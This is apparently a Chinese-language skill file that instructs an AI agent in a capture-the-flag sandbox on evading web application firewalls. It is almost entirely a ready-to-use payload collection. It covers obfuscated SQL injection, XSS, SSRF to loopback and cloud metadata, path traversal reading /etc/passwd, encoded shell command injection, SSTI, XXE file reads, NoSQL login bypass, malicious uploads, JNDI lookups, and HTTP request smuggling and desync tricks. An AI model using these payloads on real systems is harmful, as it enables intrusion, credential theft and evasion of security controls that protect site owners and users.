---
name: waf-bypass
description: >
  Bypass WAF / gateway / charblock / keyword filters (403, 406, 501, 拦截,
  非法字符) while the backend still parses the request. Per-class mutations
  first (SQLi XSS SSRF LFI RCE SSTI XXE NoSQL upload deser), then generic
  carriers: Content-Type, charset, multipart, JSON/XML parser gaps, HPP,
  chunked, HTTP/2 delayed DATA, encoding, path, oversize. Not a wordlist,
  not a product writeup. One mutation at a time.
---

# WAF 绕过 — 门 ≠ 洞不存在

403 / 406 / charblock / 「非法字符」是**门**拦了字面特征，不是参数化、也不是换 CVE。
**洞类不变。** 一次只改一种。本盒无出网：不要找源站 IP、不要 Collaborator / interactsh。

```
被拦请求 vs 无害过门请求
  → 先用该类专用变形（§1–§11）直到关键字不再触发
  → 仍拦 → 通用载体（§G）：换 parser / 协议 / 路径 / 头 / 垫长度
  → 仍拦 → 通用编码（§G.6）
```

`correct: false` 且出口已通 → 提交通道涂改，不是入口 WAF（hex 带出，通道上不要原文 `flag{`）。

## 0. 拦的是哪一层

| 现象 | 先动 |
|---|---|
| 字面路径 403，编码后变 401/400/200 | §G.4 路径 |
| body 关键字 403，空参数 200 | 该类专用变形，再 §G.1 换 parser |
| 整段 JSON/multipart 403，短 body 过 | §G.3 垫数据 / §G.1 换类型 |
| 只有某个头被拦 | §G.5 头 |
| H1 拦、H2 过（或反过来） | §G.2 HTTP/2 |
| 同一 payload GET 拦 POST 过（或反过来） | 换方法 / `X-HTTP-Method-Override` |

WAF 和后端不是同一套解析器（WAFFLED / ACSAC 2025：1207 条绕过，payload 不变只改结构）。

按类索引（拦什么 → 先试）：

| 类 | 常拦 | 先试 |
|---|---|---|
| SQLi | `'` `union` `select` `--` | 注释 / `1e0union` / `CHAR` / HPP |
| XSS | `<script` `onerror` `javascript:` `alert(` | 换标签 / 实体 / `alert\`1\`` |
| SSRF | `127.0.0.1` `file:` `169.254` | `127.1` `0` `[::1]` 十进制 IP、`@` |
| LFI | `../` `php://` `/etc/passwd` | 双重编码 / wrapper 大小写 / `....//` |
| 命令注入 | `;` `\|` `cat` 空格 `/etc` | `${IFS}` glob / base64 / `%0a` |
| SSTI | `{{` `${` `__class__` | 拆记号 / `\x5f` / `\|attr` / 换引擎括号 |
| XXE | `<!DOCTYPE` `SYSTEM` `ENTITY` | 参数实体 / UTF-16 / CDATA / PUBLIC |
| NoSQL | `$ne` `$gt` `$where` | 换算子 / JSON 体 / `[$ne]` |
| 上传 | `.php` `<?php` MIME | 双扩展 / 魔数 / Disposition 差 |
| 反序列化 / JNDI | `rO0` `Tzo` `ldap://` `${jndi` | 换类型、分块、嵌套查找 |
| CRLF / 跳转 | `%0d%0a` `http://` | 单 `%0d` / `//` / `@` |

---

## 1. SQLi

关键字常被拦：`'` `"` `union` `select` `from` `where` `--` `#` `sleep` `benchmark` `information_schema`。

**拆关键字 / 空白**

| 手法 | 例 |
|---|---|
| 块注释当空白 | `UN/**/ION/**/SE/**/LECT` |
| MySQL 执行注释 | `/*!UNION*/ /*!SELECT*/` |
| 版本注释 | `/*!50000UNION*//*!50000SELECT*/` |
| 大小写 | `uNiOn SeLeCt` |
| 空白替代 | `%09` `%0a` `%0b` `%0c` `%0d` `%a0` `%00` |
| 括号去空白 | `UNION(SELECT(1),2,3)` |
| 科学计数粘关键字 | `1e0union` `1.1union` `2e-1union` |
| 行注释变形 | `--` `--+` `--%0a` `#` `%23` `;%00` |

**逻辑 / 函数替代（签名打 `OR 1=1` / `AND 1=2` / `NULL` / `SLEEP`）**

| 拦 | 换 |
|---|---|
| `OR 1=1` | `OR 2=2` `OR 'a'='a'` `OR 0x50=0x50` `OR true` `\|\|1` `OR 1 IN (1)` `OR 1 LIKE 1` `OR 1 BETWEEN 0 AND 2` `OR 1 REGEXP 1` |
| `AND 0` | `AND 1*0` `AND 1-1` `AND char(0)` `AND mod(29,9)` `AND nullif(1,1)` |
| `UNION SELECT NULL` | `UNION ALL SELECT` `UNION DISTINCT SELECT` `UNION SELECT 0` `UNION SELECT false` `UNION SELECT char(null)` `UNION SELECT 34=35` |
| `SLEEP` / `WAITFOR` | MySQL `BENCHMARK` `GET_LOCK`；MSSQL 笛卡尔积重查询；PG `pg_sleep`；重函数替代延时 |
| `information_schema` | `mysql.innodb_table_stats` `sys.schemas` `sqlite_master` |

JSON 函数（WAF 认 `UNION`/`OR 1=1`，不认 JSON SQL）：`' OR JSON_LENGTH("{}")<=8896 UNION SELECT @@version#`；PG：`(SELECT json_agg(t) FROM t)::text`。

**去引号 / 编码关键字**

| 手法 | 例 |
|---|---|
| URL | `%27` `%22` `%2d%2d` |
| 双重 / 三重 | `%2527` `%252527` |
| IIS `%u` | `%u0027` `%u0055nion` |
| JSON `\u` | `\u0027` `\u0075\u006e\u0069\u006f\u006e` |
| 非法 UTF-8 引号 | **`%ff%27` `%c0%27`**（不要 UTF-8 编 U+00FF） |
| overlong UTF-8 | `%c0%a7` 当 `'` |
| hex 字面 | `0x756e696f6e`（= `union`）；`0x50=0x50` |
| `CHAR` / `CONCAT` | `CHAR(117,110,105,111,110)` `un'+'ion` `CONCAT(0x75,0x6e)` |
| 无引号字符串 | MySQL `0x…` / `CHAR`；PG `CHR` / `$$…$$`；MSSQL `CHAR`/`NCHAR` |
| 科学 + 注释混 | `1e0un/**/ion` |

**HPP / HPF（把一条 SQL 拆到多个参数）**

- HPP 重复名：`id=1;select+1&id=2,3+from+users--`（ASP 逗号拼接；PHP 取最后一个；JSP 取第一个）
- HPF 跨参数用注释拼：`a=1+union/*&b=*/select+1,2`（应用若拼接 a+b 则还原）
- 开引号跨参数：`year=2010' AND 'x'<>"&month=" UNION SELECT 1,2--`

库差异：MySQL 注释/`/*!/`/`#`；PG `$$`/`CHR`/`::`；MSSQL `;` 堆叠/`WAITFOR`；SQLite `\|\|`/`CHAR`。登录注入手写 payload，被拦再套本节 / §G，不要喷口令。

---

## 2. XSS

关键字常被拦：`<script` `onerror` `onload` `javascript:` `alert(` `eval(` `document.cookie`。先确认反射上下文（HTML / 属性 / JS 字符串 / URL），再变形。本盒 XSS 用 `playwright-cli` 当受害者。

**换标签 / 事件（`<script` 死了就换）**

| 手法 | 例 |
|---|---|
| 无交互 | `<img src=x onerror=alert(1)>` `<svg onload=alert(1)>` `<video src=x onerror=alert(1)>` `<audio src=x onerror=alert(1)>` `<body onload=alert(1)>` |
| 少见 / 未知标签 | `<details open ontoggle=alert(1)>` `<input autofocus onfocus=alert(1)>` `<marquee onstart=alert(1)>` `<xss onmouseover=alert(1)>` `<x id=y tabindex=1 onfocus=alert(1) autofocus>` |
| SVG 动画 | `<svg><animate onbegin=alert(1) attributeName=x></svg>` |
| math / 嵌套 | `<math><mtext><table>…` 再破标签（parser 差） |
| `/` 当空白 | `<svg/onload=alert(1)>` `<img/onerror=alert(1) src=x>` |
| 大小写 | `<sCRipT>` `oNeRrOr=` |
| 垃圾属性 | `<script/x>` `<script ~=@>` `<img """><script>` |

**去 `alert(` / 去括号 / 去引号**

| 手法 | 例 |
|---|---|
| 模板字符串 | `alert\`1\`` `alert\`XSS\`` |
| 换函数 | `confirm(1)` `prompt(1)` `print()` `throw 1` |
| 命名实体括号 | `alert&lpar;1&rpar;` |
| JS unicode | `\u0061lert(1)` `\u0061\u006c\u0065\u0072\u0074(1)` |
| hex JS | `\x61lert(1)` |
| fromCharCode | `eval(String.fromCharCode(97,108,101,114,116,40,49,41))` |
| atob | `eval(atob('YWxlcnQoMSk='))` |
| 拼接 | `eval('ale'+'rt(1)')` `window['ale'+'rt'](1)` |

**编码（WAF 看原文，浏览器 / 属性解码后执行）**

| 手法 | 例 |
|---|---|
| HTML 实体 | `&#x61;lert` `&#97;lert` `&#x3c;script&#x3e;` |
| 前导零 / 无分号 | `&#000097;` `&#x00061;` `&#x61lert`（属性值里浏览器仍解） |
| `javascript:` 拆 | `ja&#x76;ascript:` `javascript&#58;` `java&#115;cript:` |
| URL | `%3Cscript%3E`；双重 `%253C` |
| 空字节 | `<scri%00pt>` `<script%00>` |
| 空白塞标签名 | `%09` `%0a` `%0d` `%08`：`<s%09cript>` |
| 全角 / NFKC | `＜script＞` `＝`（后端归一成 ASCII） |
| 混合 | 实体 + URL + `\u` 叠一层，不要五层 |

HTML 属性值会先解实体再当 JS：`<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">`。`javascript:` 拦了就实体拆 `j`/`s`/`:`。

---

## 3. SSRF

关键字常被拦：`127.0.0.1` `localhost` `0.0.0.0` `file:` `gopher:` `169.254` `::1`。无出网：只打本机 / 题目内网，不要 OAST、不要 nip.io / 攻击者 DNS。

**同一地址的不同写法（过滤器做字面比较就死）**

| 手法 | `127.0.0.1` | `169.254.169.254` |
|---|---|---|
| 短点分 | `127.1` `127.0.1` | — |
| 整个环回网 | `127.2.3.4`（整段 `127.0.0.0/8`） | — |
| 十进制 | `2130706433` | `2852039166` |
| hex | `0x7f000001` `0x7f.0x0.0x0.0x1` | `0xa9fea9fe` |
| 八进制 | `0177.0.0.1` `017700000001` | `0251.0376.0251.0376` |
| 溢出 | `127.0.0.257`（有的栈 `%256` → `.1`） | — |
| `0` | `http://0/` `0.0.0.0` | — |
| IPv6 | `[::1]` `[::]` `[0000::1]` | `[::ffff:169.254.169.254]` |
| IPv4-mapped | `[::ffff:127.0.0.1]` `[::ffff:7f00:1]` `[0:0:0:0:0:ffff:7f00:1]` | `[0:0:0:0:0:ffff:a9fe:a9fe]` |
| Unicode 点 | `127。0。0。1` `%E3%80%82` | 圈数字 `①②⑦.⓪.⓪.①` |

**URL 解析差**

| 手法 | 例 |
|---|---|
| userinfo `@` | `http://evil@127.0.0.1` `http://127.0.0.1#@evil`（谁认 host） |
| 反斜杠 | `http://127.0.0.1\` `http:\\127.0.0.1` |
| 碎片 / 空字节 | `#` `%00` 截断过滤器看到的 host |
| 改 scheme | `file:///etc/passwd` `file://localhost/etc/passwd` `gopher://127.0.0.1:6379/_…` `dict://127.0.0.1:11211/` `ldap://127.0.0.1` |
| 本机名 | `localhost`（不要靠出网 DNS 转 127.0.0.1） |
| 302 跟跳 | 本机允许的 URL 再 302 到 `127.0.0.1`（应用跟跳、过滤器不跟） |
| 大小写 / 编码 | `File://` `fIlE:` `%66ile://` |

云元数据（题目若是云形态）：`169.254.169.254` 用上表编码；AWS 路径 `/latest/meta-data/`；GCP 要头 `Metadata-Flavor: Google`；Azure 要头 `Metadata: true`。不要出网。

---

## 4. LFI / 路径穿越 / RFI

关键字常被拦：`../` `..\` `/etc/passwd` `php://` `file://` `data://` `expect://`。

**穿越本身**

| 手法 | 例 |
|---|---|
| URL | `%2e%2e%2f` `%2e%2e/` `..%2f` `%2e%2e%5c` |
| 双重 / 三重 | `%252e%252e%252f` `..%252f` |
| IIS `%u` | `%u002e%u002e%u002f` |
| overlong UTF-8 | `%c0%ae%c0%ae%c0%af` `%c0%ae` 当 `.` |
| 剥 `../` 的过滤器 | `....//` `..././` `..;/` `..\/` |
| 混斜杠 | `..\..\windows\win.ini` `/\` `//` |
| 空字节截断（PHP < 5.3.4） | `/etc/passwd%00` `/etc/passwd%00.png` |
| 点截断 / 超长 | 尾 `.` 尾空格 `%20`；把强制后缀挤出 4096 字节 |
| 绝对路径 | `/etc/passwd` `/proc/self/environ` `/proc/self/cwd/flag` `/proc/self/root/etc/passwd` |
| Windows | `..\..\windows\win.ini` 尾 `.` `::$DATA` |

**PHP wrapper（`php://` 死了就变形，不要换洞）**

| 手法 | 例 |
|---|---|
| 大小写 | `pHp://FilTer/convert.base64-encode/resource=index.php` |
| 编码冒号 | `php%3a//filter/…` `php%253a%252f%252f` |
| 前缀逃出 | `../../php://filter/convert.base64-encode/resource=config` |
| 读源码 | `php://filter/convert.base64-encode/resource=` `string.rot13` `zlib.deflate` |
| 链 | `php://filter/convert.iconv.utf-8.utf-16/resource=`；filter chain 无文件 RCE |
| 其它 wrapper | `php://input`（POST 体当文件）`data://text/plain;base64,…` `expect://id` `zip://` `phar://` `glob://` |

RFI：`http://` 拦了试 `\\host\share\a.php`（Windows）、双重编码 URL、`ftp://`。无出网则只指向题目给的地址或本机。

---

## 5. 命令注入 / 体 RCE

关键字常被拦：`;` `|` `&` `` ` `` `$()` 空格 `cat` `ls` `id` `whoami` `wget` `curl` `/etc/passwd` `/bin/`。

**分隔与空白**

| 手法 | 例 |
|---|---|
| 换分隔 | `;` `\|` `\|\|` `&&` `&` `%0a` `%0d%0a` `` `id` `` `$(id)` |
| 空格 → IFS | `cat${IFS}/etc/passwd` `cat$IFS$9/etc/passwd` |
| 空格 → tab | `%09` |
| 花括号展开 | `{cat,/etc/passwd}` |
| 重定向当空白 | `cat</etc/passwd` `cat<>/etc/passwd` |
| bash here-string 去管道 | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)` |

**关键字 / 路径伪装**

| 手法 | 例 |
|---|---|
| glob | `/???/??t` `/bin/c?t` `/e*c/p*sswd` `cat /???/??ss??` |
| 插引号 | `ca''t` `w"h"oami` `c'a't` |
| `$@` / `\` | `cat$@` `/bin/cat` 里插 `\`：`c\at` |
| 环境变量拼 `/` `;` | `${PATH:0:1}` → `/`；`${LS_COLORS:10:1}` 偶尔是 `;` |
| 大小写 / rev | `$(tr A-Z a-z<<<'WhOaMi')` `$(rev<<<'imaohw')` |
| base64 | `echo${IFS}Y2F0IC9ldGMvcGFzc3dk\|base64${IFS}-d\|bash` |
| hex / 八进制 | `$(printf '\x69\x64')` `$(echo -e '\x63\x61\x74')` |
| ANSI-C | `$0<<<$'\x69\x64'` |

Windows：`^` 转义、`%COMSPEC%`、PowerShell `-EncodedCommand`、`%PATHEXT:~3,1%`。Log4j / JNDI 见 §10，用本机 `rogue-jndi`。

---

## 6. SSTI

关键字常被拦：`{{` `}}` `${` `__class__` `__mro__` `request` `config`。先探针认引擎，再按引擎变形。

探针：`{{7*7}}` → 49 则 Jinja/Twig/Pebble；`{{7*'7'}}` → `7777777` Jinja2、`49` Twig；`${7*7}` Freemarker/Velocity/EL；`<%=7*7%>` ERB/EJS；`{7*7}` Smarty；`*{7*7}` Thymeleaf。

| 拦 | 换 |
|---|---|
| `{{` `}}` | `{% %}`（Jinja/Twig 语句）；换引擎括号 `${` `<#` `<%=` `[[` |
| `__` | `\x5f\x5fclass\x5f\x5f` `\u005f` `'__cl'+'ass__'` `request.args` 把关键字放别的参数 |
| `[]` / `.` | `\|attr('__class__')` `\|attr(request.args.x)` |
| 字面 `class` | `request\|attr(request.args.q)` 且 `?q=__class__` |
| 整段表达式 | JSON `\u007b\u007b`；URL `%7b%7b`；拆成两个字段再拼 |

Jinja：`{{request\|attr('\x5f\x5fclass\x5f\x5f')}}`。Twig 老版本 `_self.env`；新版本 `\|map` / `\|filter`。Freemarker：`?new()` + `Execute`。不要一上来丢完整 RCE 链——先让 `{{7*7}}` 过门。

---

## 7. XXE

关键字常被拦：`<!DOCTYPE` `SYSTEM` `ENTITY` `file://` `<!ENTITY`。XML 体优先改结构 / 编码，payload 语义不动。

| 手法 | 例 |
|---|---|
| 参数实体 | `<!ENTITY % e SYSTEM "file:///etc/passwd"> %e;`（GENERAL 实体被拦时） |
| PUBLIC 顶 SYSTEM | `<!ENTITY % xxe PUBLIC "x" "file:///etc/passwd">` |
| CDATA 包关键字 | `<![CDATA[file:///etc/passwd]]>` |
| 实体编码 SYSTEM | `&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;`；Akamai 类：HTML 实体包整段声明 |
| 空白 / 换行拆标签 | `<!DOCTYPE foo [\n<!ENTITY\nxxe\nSYSTEM\n"file:///etc/passwd"\n]>` |
| 大小写 | `<!doctype` `<!EnTiTy` |
| 命名空间 | `<a:id xmlns:a="urn:x">`（WAF 看带前缀名） |
| 错闭合 | 多一个 `]`、尾部垃圾、第二个 DOCTYPE |
| UTF-16 / UTF-32 / EBCDIC | `iconv -t UTF-16BE` 整 body；`Content-Type: application/xml; charset=utf-16` |
| 双编码 | 声明 `encoding="UTF-16BE"` 但声明本身是 UTF-8，其后是 UTF-16 |
| BOM / 前导空白 | 文件头 BOM；`<?xml` 前塞空格（懒 WAF 只扫开头） |
| XInclude / SOAP / SVG / XLSX / `application/xml` | 换载体类型，DTD 仍在 |

无出网：`SYSTEM "file:///…"` 或本机 `expect://` / `php://`；不要外部 DTD URL。

---

## 8. NoSQL

关键字常被拦：`$ne` `$gt` `$regex` `$where` `$or`。很多 WAF 只扫 querystring 里的 `$`，JSON 体不认。

| 手法 | 例 |
|---|---|
| 换算子 | `$ne` → `$gt` `$gte` `$nin` `$exists` `$in` `$regex` |
| JSON 体 | `{"username":{"$ne":""},"password":{"$ne":""}}` |
| 表单数组 | `username[$ne]=x&password[$ne]=x` |
| `$gt` 空串 | `{"password":{"$gt":""}}` |
| `$regex` | `{"username":{"$regex":"^a"}}` |
| `$where` | 拦了 `$ne` 再试；JS 里拆字符串 |
| 重复键 | JSON `{"user":"safe","user":{"$ne":""}}`（谁取最后一个） |
| 编码 `$` | `%24ne` `\u0024ne`；换 `Content-Type: application/json` |

---

## 9. 文件上传

拦扩展名 / MIME / 内容 / `<?php` / `.php`。WAF 和后端各看一份 `filename` / `Content-Type` / boundary。

| 拦 | 换 |
|---|---|
| `.php` | `.php5` `.phtml` `.phar` `.php.jpg` `.php.` `.Php` `.php%00.jpg` `.php;.jpg` |
| MIME | part 上 `Content-Type: image/jpeg` / `application/octet-stream`（文件仍是脚本） |
| 内容检测 | 魔数前缀 `GIF89a` / `\xff\xd8\xff` / `\x89PNG` 再跟脚本（polyglot） |
| `<?php` | 短标签 `<?=`；UTF-16 脚本；放在 EXIF / 图片注释 |
| `filename=` | 重复 `filename=`（WAF 取一个、后端取另一个）；`filename="a.php "`；`name="f\x00"`；引号混用 |
| `Content-Disposition` | 双写这一行；中间插 TAB / 空格 / `filename*=`（RFC 2231） |
| boundary | §G.1 multipart：假 boundary、`boundary*0=`、`\x00`、引号 |
| SVG / HTML | 当 XSS 上传，不走 `.php` |

---

## 10. 反序列化 / JNDI

| 拦 | 换 |
|---|---|
| Java `rO0` | URL / 双重 / 分块 / 垫 8KB；换 `application/x-java-serialized-object` ↔ JSON ↔ form |
| PHP `Tzo` / `O:` | `C:` 自定义；`utf8_decode` 过滤差；换 Content-Type |
| `.NET` `AAEAAAD` | 同上，载体先走 |
| `${jndi:ldap://` | 嵌套 `${${::-j}ndi:…}` `${${lower:j}ndi:…}`；`ldap`→`rmi`/`dns`/`iiop`；unicode / 大小写 `jNdI` |
| `ldap://` 字面 | JSON `\u006c\u0064\u0061\u0070://`；URI 只负责连通，factory 放 LDAP 响应 |

Log4j：本机 `rogue-jndi` + `ldaps-wrap` + `java8`。无出网。

---

## 11. CRLF / 开放重定向

| 类 | 手法 |
|---|---|
| CRLF | `%0d%0a` `%0d` `%0a` `%0d%0a%09`；overlong `%E5%98%8A%E5%98%8D`（`囆囅` → CRLF）；Unicode 行分隔 `U+2028` |
| 重定向 | `//127.0.0.1` `/\127.0.0.1` `https:%2f%2f` `@` `\/\`；`.` 编码；`///`；缺 scheme 的 `//` |

只指向题目 / 本机。

---

## G. 通用载体（类内变形仍拦再套）

类内变形仍拦，**payload 原样不动**，改载体。WAF 按声明选 parser，选错就不查真正的字段。后端 urlencoded 和 multipart 常常同一套 API（野外 >90% 互通）。

### G.1 Content-Type / 解析差（优先）

**换类型（同一组字段，原 payload 原样塞进去）**

| 试 | 头 |
|---|---|
| urlencoded | `application/x-www-form-urlencoded` |
| JSON | `application/json` / `application/ld+json` / `text/json` |
| multipart | `multipart/form-data` 或 `multipart/mixed`（有的 WAF 只查 form-data） |
| XML | `application/xml` `text/xml` `application/soap+xml` |
| 省略 | 不发 Content-Type（部分 WAF 直接不查 body） |
| 生造 | `application/x-custom` `text/plain` |
| 错配 | JSON 体 + urlencoded 头，或反过来（后端按体嗅探） |
| 多个 Content-Type | 两个头；WAF 认第一个，后端认最后一个（CRS 旧版） |
| 头里塞干扰参数 | `application/json; charset=utf-8; boundary=evil`（有的 parser 遇到 charset 就停） |

**JSON（WAF 严格，后端 JSON5/宽松）**

- 注释：`{"id":1 /*x*/ }` 或 `//x` 打断关键字
- 重复键：`{"id":"safe","id":"payload"}`（谁取第一个谁取最后一个）
- `\uXXXX` 逃每个字母，不只逃尾巴
- 键名里插 `\x00`：`{"id\x00": "..."}`
- 深嵌套超过 WAF JSON 深度：`{"a":{"b":{"c": payload}}}`
- 数字伪装：`1e0` 后直接拼关键字

**XML** — 见 §7；通用还有命名空间、参数实体、CDATA、错闭合。

**multipart（结构最肥，351+ 类）**

- RFC 2231 续参：`boundary=fake; boundary*0=real-; boundary*1=boundary`  
  WAF 吃 `fake`，后端拼成 `real-boundary`，恶意字段放在真边界里
- 第二份 `boundary=`、引号、`;`、空白、TAB、过长 boundary
- 去掉 `--boundary` 前的 `\r\n`；混用 `\n` / `\r\n`
- boundary 里 `\x00` 或 `; charset=`
- 恶意 charset 放**前面的 part**，最后 part 用 utf-8（不少规则只校验最后一个 part）
- part 上 `Content-Type: image/jpeg` / `application/octet-stream`（当二进制跳过）
- `--bound--` 终结后再跟一个 part
- `Content-Disposition` 重复 `name=` / `filename=`；`name="f\x00"`
- 每 part 自己的 `Content-Transfer-Encoding: base64` / `quoted-printable`

### G.2 协议（整段 body 从 WAF 眼皮底下溜走）

这些不改 payload，改「请求在哪结束」。只打 `container_addr`。

**HTTP/1.1**

- `Transfer-Encoding: chunked`：把关键字切开（`sel` / `ect`）
- chunk 扩展：`5;foo=bar\r\nHELLO`（扩展被一边忽略一边当长度）
- chunk 尺寸变形：`05`、`5 `、`5\t`、大写 hex
- 同时带 CL 和 TE（CL.TE / TE.CL）：前端和后端对「请求结束」意见不同
- 两个 `Content-Length`、`Content-Length: 05`、`+13`、尾空白
- TE 变形：`chunked` / `xchunked` / `chunked ` / 大小写 / 引号 / TE 里 unicode 空白 / `\x00`
- `Transfer-Encoding: \r\n chunked` 折行
- GET/HEAD 带 body（有的前端不读 body，后端读）
- HTTP/1.0 持久连接 vs 1.1
- 方法大小写：`post` / `PoSt`（部分 Apache）
- 请求行前多一个 `\r\n`

**HTTP/2（`curl --http2`，目标若只说 h2）**

- **HEADERS 先到、DATA 晚到**：外置 WAF 只看见头就放行，body 后到（延迟 200–500ms）。H1 同 payload 403、H2 拆帧 200 就是这类
- H2→H1 降级：伪头/头值里塞 `\r\nTransfer-Encoding: chunked`（H2.CL / H2.TE）
- `:path` / `:method` 绕过只扫普通头的规则
- H2C：`Upgrade: h2c` + `HTTP2-Settings`（明文 h2，部分反代把后续字节当已升级，WAF 不再看）
- 流优先级 / 依赖树畸形（结构合法、payload 不变；部分 H2 WAF 跟丢流）

### G.3 长度、压缩、位置

- 体检查窗口：JSON 先放一个无害大字段，或 multipart 先垫大文本 part，payload 放 **8KB / 16KB / 64KB 之后**（AWS 常见 8KB；部分 CDN 超长 fail-open）
- `Content-Encoding: gzip` / `deflate`：WAF 不解开，后端解；生造 `Content-Encoding: random` 有的栈直接不查 body
- 关键字拆进两个相邻 chunk / 两个 JSON 字符串再拼
- 同一连接后续请求检查变松：先发无害 keep-alive，再发真 payload（少见，值得试一次）

### G.4 路径与查询串

字面路径 403 → 改路径不换洞。403→401/400 就是过门。

- `%61` 单字节、`%2561` 双重、三重 `%252561`
- `/./` `//` `///` `/.` `/;` `/;` + junk（Tomcat 剥 `;`）
- `\` 当 `/`（IIS / 部分 WHATWG）
- `%00` 截断、尾 `.` 尾空格 `%20`（Windows）
- 点编码：`%2e` `%252e` `..;/` `....//`
- 查询分隔：路径里 `%3f` 当 `?`（WAF 当路径，后端当 query）
- 大小写 `/AdMin`、Unicode 兼容形 `／` `‥`

### G.5 头

- 头名大小写、`Content-Type` vs `content-type` vs `CONTENT-TYPE`
- 折叠空白、TAB 代替空格
- 重复头：WAF 拼、后端取最后（或反过来）
- 把 payload 挪到少查的头：`Referer` `X-Forwarded-For` `X-Original-URL` `X-Rewrite-URL` `X-Forwarded-Host` `X-HTTP-Method-Override`
- 方法覆盖：`X-HTTP-Method-Override: POST` + GET 查询串；`_method=`
- 头名里 `\x00` / 非法 token（H2 能带、H1 不能）

### G.6 通用编码（载体过了仍拦关键字才用）

每次只挑一行。JSON 语境用 `\u`；HTML 用实体；SQL 用注释/科学计数。

| 手法 | 例 |
|---|---|
| URL | `%27` `%3C` `%3B` |
| 双重/三重 | `%2527` `%252527` |
| IIS `%u` | `%u0027` `%u003C` |
| JSON | `\u0027` `\u0075\u006e\u0069\u006f\u006e` |
| HTML 实体 | `&#x27;` `&#60;` |
| overlong UTF-8 | `%c0%a7` 当 `'`；`%c0%ae` 当 `.`；`%c0%bc` 当 `<`（旧解析器） |
| 非法 UTF-8 引号 | 线上 **`%ff%27` `%c0%27`**（不要 UTF-8 编 U+00FF） |
| 空字节 | `uni%00on` `<scri%00pt>` |
| 空白 | `/**/` `%09` `%0b` `%0c` `%0d` `%a0` |
| NFKC 兼容字 | 全角 `＜` `＝` `／` 在后端归一成 ASCII |
| charset 整段 | 声明 `ibm037` / `utf-16le` / `utf-7` 后整 body 用该编码（WAF 当 ASCII 对不上签名） |

### G.7 HPP / HPF

见 §1。对任何「WAF 只检查第一个同名参数、后端拼 / 取最后一个」的洞都通用：XSS 事件、SSRF URL、LFI 路径同样可拆。

---

## 怎么试

1. 存被拦请求 + 无害过门请求。对比差的是路径、某个关键字、还是整段 body。
2. 认类 → 该类表里从上往下改**一种**。过门（状态码 / Content-Type / JSON 形变了）再加下一刀。
3. 类内变形不够 → §G 换载体，payload 原样塞进去。
4. 停在该 sink。不要 ffuf 扫目录、不要换 CVE。
5. 写 `artifacts/exp.py`（`http.client` 比 curl 好造 TE/chunk/原始头）。H2 用 `curl --http2` 或 `httpx`。
6. 对不上就回到 §G.1 换下一种 Content-Type，不要一次叠五层。

## 不要

- 403 = 洞死了 / 换下一条 CVE
- 一次叠五种编码
- 大字典、整库 nuclei、年目录
- 出网找源站 IP / OAST
